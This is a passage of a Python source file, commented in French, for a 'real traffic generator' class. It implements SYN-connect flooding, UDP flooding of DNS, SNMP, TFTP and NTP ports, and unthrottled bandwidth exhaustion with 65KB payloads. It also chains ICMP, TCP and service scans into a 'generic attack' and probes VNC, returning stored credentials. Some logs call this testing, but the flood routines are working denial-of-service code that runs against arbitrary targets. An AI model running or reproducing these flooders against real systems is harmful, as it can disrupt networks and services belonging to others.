        """Envoie un paquet SYN."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)  # Timeout très court
            
            # Tenter la connexion sans la compléter (SYN sans ACK)
            try:
                sock.connect_ex((target, port))
            except:
                pass
            
            sock.close()
            return {"packets_sent": 1}
            
        except Exception:
            return {"packets_sent": 0}
    
    async def _real_udp_flood(self, targets: List[str], config: Dict, duration: int) -> Dict:
        """UDP Flood réel."""
        packets_sent = 0
        
        logger.warning("⚠️ UDP Flood RÉEL en cours...")
        
        end_time = time.time() + duration
        payload = b"X" * 1024  # Payload de 1KB
        
        with ThreadPoolExecutor(max_workers=config["max_threads"]) as executor:
            while time.time() < end_time:
                futures = []
                
                for target in targets:
                    # Flood sur ports UDP communs
                    for port in [53, 161, 69, 123]:
                        future = executor.submit(self._send_udp_packet, target, port, payload)
                        futures.append(future)
                
                for future in as_completed(futures, timeout=1):
                    try:
                        result = future.result()
                        packets_sent += result.get("packets_sent", 0)
                    except:
                        pass
                
                await asyncio.sleep(1.0 / config["packet_rate"])
        
        return {"packets_sent": packets_sent}
    
    def _send_udp_packet(self, target: str, port: int, payload: bytes) -> Dict:
        """Envoie un paquet UDP."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload, (target, port))
            sock.close()
            return {"packets_sent": 1}
        except Exception:
            return {"packets_sent": 0}
    
    async def _real_bandwidth_exhaustion(self, targets: List[str], config: Dict, duration: int) -> Dict:
        """Épuisement de bande passante réel."""
        packets_sent = 0
        
        logger.warning("⚠️ Test d'épuisement de bande passante RÉEL...")
        
        end_time = time.time() + duration
        large_payload = b"X" * 65000  # Payload maximum UDP
        
        with ThreadPoolExecutor(max_workers=config["max_threads"]) as executor:
            while time.time() < end_time:
                futures = []
                
                for target in targets:
                    future = executor.submit(self._send_large_packets, target, large_payload)
                    futures.append(future)
                
                for future in as_completed(futures, timeout=1):
                    try:
                        result = future.result()
                        packets_sent += result.get("packets_sent", 0)
                    except:
                        pass
                
                # Pas de rate limiting pour maximiser la bande passante
                await asyncio.sleep(0.001)
        
        return {"packets_sent": packets_sent}
    
    def _send_large_packets(self, target: str, payload: bytes) -> Dict:
        """Envoie de gros paquets pour saturer la bande passante."""
        packets_sent = 0
        
        try:
            # UDP pour éviter la limitation TCP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Envoyer plusieurs paquets rapidement
            for port in [53, 80, 443, 161]:
                try:
                    sock.sendto(payload, (target, port))
                    packets_sent += 1
                except:
                    pass
            
            sock.close()
            return {"packets_sent": packets_sent}
            
        except Exception:
            return {"packets_sent": 0}
    
    # =============================
    # ATTAQUE GÉNÉRIQUE RÉELLE
    # =============================
    
    async def _execute_generic_real_attack(self, targets: List[str], attack_type: str, intensity: str, duration: int) -> Dict:
        """Exécute une attaque générique réelle."""
        config = self.attack_configs[intensity]
        
        logger.info(f"🎯 Attaque générique {attack_type} sur {len(targets)} cibles")
        
        # Combiner plusieurs types d'attaques pour un test générique
        results = []
        
        # Scan de base
        icmp_result = await self._execute_real_icmp_scan(targets, intensity, duration // 3)
        results.append(icmp_result)
        
        # Scan de ports
        tcp_result = await self._execute_real_tcp_scan(targets, [22, 23, 80, 443, 161], intensity, duration // 3)
        results.append(tcp_result)
        
        # Test de services
        service_result = await self._real_service_enumeration(targets, config, duration // 3)
        results.append(service_result)
        
        # Compiler les résultats
        total_packets = sum(r.get("packets_sent", 0) for r in results)
        all_services = []
        all_vulnerabilities = []
        
        for result in results:
            all_services.extend(result.get("services", []))
            all_vulnerabilities.extend(result.get("vulnerabilities", []))
        
        return {
            "success": True,
            "packets_sent": total_packets,
            "responses_received": sum(r.get("responses_received", 0) for r in results),
            "services": list(set(all_services)),
            "vulnerabilities": list(set(all_vulnerabilities))
        }
    
    # =============================
    # MÉTHODES UTILITAIRES  
    # =============================
    
    def _is_valid_ip(self, ip: str) -> bool:
        """Vérifie si une chaîne est une IP valide."""
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    async def test_vnc_connection(self, target: str, timeout: float = 10) -> Dict[str, Any]:
        """
        Teste la connexion VNC vers un équipement avec les credentials configurés.
        
        Args:
            target: Adresse IP de l'équipement
            timeout: Timeout de connexion
            
        Returns:
            Résultat du test de connexion VNC
        """
        try:
            logger.info(f"🔐 Test de connexion VNC vers {target}")
            
            # Test de base : vérifier que le port 5901 (VNC) est ouvert
            vnc_port = 5901
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            
            result = sock.connect_ex((target, vnc_port))
            
            if result == 0:
                # Port ouvert, essayer de lire la version VNC
                try:
                    # Lire la version du protocole VNC
                    version_data = sock.recv(12)  # "RFB 003.008\n"
                    version_str = version_data.decode('ascii', errors='ignore')
                    
                    if version_str.startswith('RFB'):
                        logger.info(f"✅ VNC détecté sur {target}:{vnc_port} - {version_str.strip()}")
                        
                        # Envoyer notre version
                        sock.send(b"RFB 003.008\n")
                        
                        # Lire les types d'authentification supportés
                        try:
                            auth_data = sock.recv(1024)
                            sock.close()
                            
                            return {
                                "success": True,
                                "target": target,
                                "port": vnc_port,
                                "version": version_str.strip(),
                                "authentication_available": len(auth_data) > 0,
                                "credentials": self.vnc_credentials
                            }
                        except socket.timeout:
                            sock.close()
                            return {
                                "success": True,
                                "target": target,
                                "port": vnc_port,
                                "version": version_str.strip(),
                                "authentication_available": False,
                                "credentials": self.vnc_credentials
                            }
                    else:
                        sock.close()
                        return {
                            "success": False,
                            "target": target,
                            "port": vnc_port,
                            "error": "Réponse VNC invalide"
                        }
                        
                except socket.timeout:
                    sock.close()
                    return {
                        "success": False,
                        "target": target,
                        "port": vnc_port,
                        "error": "Timeout lors de la lecture de la version VNC"
                    }
            else:
                sock.close()
                return {
                    "success": False,
                    "target": target,
                    "port": vnc_port,
                    "error": f"Port VNC fermé (code: {result})"
                }
                
        except Exception as e:
            return {
                "success": False,
                "target": target,
                "port": vnc_port,
                "error": f"Erreur de connexion VNC: {str(e)}"
            }
    
    async def scan_vnc_equipment(self, targets: List[str]) -> Dict[str, Any]:
        """
        Scanne plusieurs équipements pour détecter les services VNC.
        
        Args:
            targets: Liste des adresses IP à scanner
            
        Returns:
            Résultats des scans VNC
        """
        logger.info(f"🔍 Scan VNC sur {len(targets)} équipements")
        
        vnc_results = {}
        
        # Tester chaque équipement
        for target in targets:
            if self._is_valid_ip(target):
                vnc_result = await self.test_vnc_connection(target)
                vnc_results[target] = vnc_result
                
                if vnc_result["success"]:
                    logger.info(f"✅ VNC trouvé sur {target}")
                else:
                    logger.debug(f"❌ Pas de VNC sur {target}: {vnc_result.get('error', 'Unknown')}")
        
        vnc_count = sum(1 for r in vnc_results.values() if r["success"])
        
        logger.info(f"📊 Scan VNC terminé: {vnc_count}/{len(targets)} équipements avec VNC")
        
        return {
            "total_scanned": len(targets),
            "vnc_found": vnc_count,
            "vnc_results": vnc_results,
            "credentials_available": self.vnc_credentials
        }
    
    def get_attack_results(self) -> List[AttackResult]:
        """Retourne tous les résultats d'attaques."""
        return self.results.copy()
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques des attaques."""
        if not self.results:
            return {"no_results": True}
        
        total_packets = sum(r.packets_sent for r in self.results)
        successful_attacks = sum(1 for r in self.results if r.success)
        total_vulns = sum(len(r.vulnerabilities_found) for r in self.results)
        
        return {
            "total_attacks": len(self.results),
            "successful_attacks": successful_attacks,
            "success_rate": successful_attacks / len(self.results) * 100,
            "total_packets_sent": total_packets,
            "total_vulnerabilities": total_vulns,
            "average_execution_time": sum(r.execution_time for r in self.results) / len(self.results)
        }

# Fonction utilitaire pour créer un générateur
def create_real_traffic_generator(django_comm=None) -> RealTrafficGenerator:
    """Crée et retourne un générateur de trafic réel."""
    return RealTrafficGenerator(django_comm=django_comm)